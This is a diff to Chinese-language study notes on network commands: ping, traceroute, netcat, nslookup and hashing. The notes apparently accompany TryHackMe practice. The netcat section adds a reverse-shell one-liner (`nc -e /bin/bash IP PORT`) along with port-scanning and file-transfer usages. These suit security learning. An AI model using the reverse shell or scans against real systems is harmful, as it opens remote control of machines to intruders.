@@ -9,29 +9,6 @@
 
 `ping IP address or website URL`
 
-<details>
-<summary>參數說明</summary>
-
-`ping -c 10 MACHINE_IP`
-
-| 參數                            | 解釋                  |
-|:------------------------------|:--------------------|
-| `-c` (Linux) / `-n` (Windows) | 自訂封包數量              |
-| `-s` (Linux) / `-l` (Windows) | 自訂封包大小（以 bytes 為單位） |
-
-</details>
-
----
-
-### `traceroute`
-
->網路診斷工具，追蹤資料封包從你電腦到目標主機所經過的路由節點（預設情況下走 UDP）
-
->Linux內建指令
-
-`traceroute IP address or website URL`
-
-
 
 <details>
 <summary>參數說明</summary>
@@ -51,6 +28,19 @@
 
 </details>
 
+
+---
+
+### `traceroute`
+
+>網路診斷工具，追蹤資料封包從你電腦到目標主機所經過的路由節點（預設情況下走 UDP）
+
+>Linux內建指令
+
+`traceroute IP address or website URL` （Linux、Mac）
+
+`tracert IP address or website URL` （MS Windows）
+
 ---
 
 ### `nc`
@@ -66,12 +56,33 @@
 
 `nc -lvnp 4444`
 
-| 參數 | 解釋 |
-|:----|:----|
-| `-l` | listen 模式 |
-| `-v` | verbose（顯示更多細節） |
-| `-n` | 不做 DNS 查詢 |
-| `-p 4444` | 指定監聽 port（可自選） |
+| 參數        | 解釋                              |
+|:----------|:--------------------------------|
+| `-l`      | listen 模式                       |
+| `-v`      | verbose（回報狀態）                   |
+| `-vv`     | very verbose（詳細回報狀態）            |
+| `-n`      | 不做 DNS 查詢                       |
+| `-p 4444` | 指定監聽 port（可自選）                  |
+| `-w`      | 設定 timeout（單位是秒）                |
+| `-z`      | 只掃 port，不傳資料（通常配合 -v 看開啟的 port） |
+| `-e`      | 執行程式                            |
+| `-k`      | 用戶端斷開連接後繼續偵聽                         |
+
+- 小於 1024 的 port 需要 root 許可權才能偵聽
+
+
+🎯 常見參數整理
+
+| 用法                        | 說明                    |
+|---------------------------| --------------------- |
+| `nc IP port`              | 抓 Banner，像 telnet     |
+| `nc -lvnp PORT`           | 開啟監聽器                 |
+| `nc -vn IP PORT`          | 快速 TCP 探測（有無通訊）       |
+| `nc -w 1 -zv IP 20-100`   | TCP 掃 port（加 `-z` 模式） |
+| `nc -e /bin/bash IP PORT` | 反彈 Shell（需具備 `-e` 版本） |
+| `nc -l > file.txt`        | 等待接收檔案（Server）        |
+| `nc IP PORT < file.txt`   | 傳送檔案給對方（Client）       |
+
 
 
 </details>
@@ -246,6 +257,21 @@
 | `-vc`                | 使用 TCP 查詢（預設是 UDP）      | `nslookup -vc example.com`         |
 | `-norecurse`         | 不讓 DNS 伺服器遞迴查詢（測試權威伺服器） | `nslookup -norecurse example.com`  |
 
+</details>
+
+<details>
+<summary>常見用法範例</summary>
+
+
+| 查詢內容        | 指令範例                             | 說明                           |
+|-----------------|----------------------------------|--------------------------------|
+| A 紀錄（IPv4）  | `nslookup tryhackme.com`         | 查詢對應的 IPv4 位址          |
+| 指定 DNS 伺服器 | `nslookup tryhackme.com 8.8.8.8` | 使用 Google DNS 查詢          |
+| MX 記錄         | `nslookup -type=mx gmail.com`    | 查詢處理郵件的伺服器地址       |
+| NS 記錄         | `nslookup -type=ns google.com`   | 查詢該網域的名稱伺服器         |
+| TXT 記錄        | `nslookup -type=txt example.com` | 查詢 SPF、驗證碼等文字記錄     |
+| 反查 IP         | `nslookup 8.8.8.8`               | 查詢該 IP 對應的主機名稱       |
+
 
 </details>
 
@@ -255,22 +281,6 @@
 
 > 產生 SHA-256 雜湊值（hash）， 可以拿來驗證檔案完整性、比對惡意樣本、與情資平台交叉分析。
 
-
-
-
-## ✅ 常見用法範例
-
-| 查詢內容        | 指令範例                           | 說明                           |
-|-----------------|------------------------------------|--------------------------------|
-| A 紀錄（IPv4）  | `nslookup tryhackme.com`           | 查詢對應的 IPv4 位址          |
-| 指定 DNS 伺服器 | `nslookup tryhackme.com 8.8.8.8`   | 使用 Google DNS 查詢          |
-| MX 記錄         | `nslookup -type=mx gmail.com`      | 查詢處理郵件的伺服器地址       |
-| NS 記錄         | `nslookup -type=ns google.com`     | 查詢該網域的名稱伺服器         |
-| TXT 記錄        | `nslookup -type=txt example.com`   | 查詢 SPF、驗證碼等文字記錄     |
-| 反查 IP         | `nslookup 8.8.8.8`                  | 查詢該 IP 對應的主機名稱       |
-
-
-</details>
 
 ## 套件
 
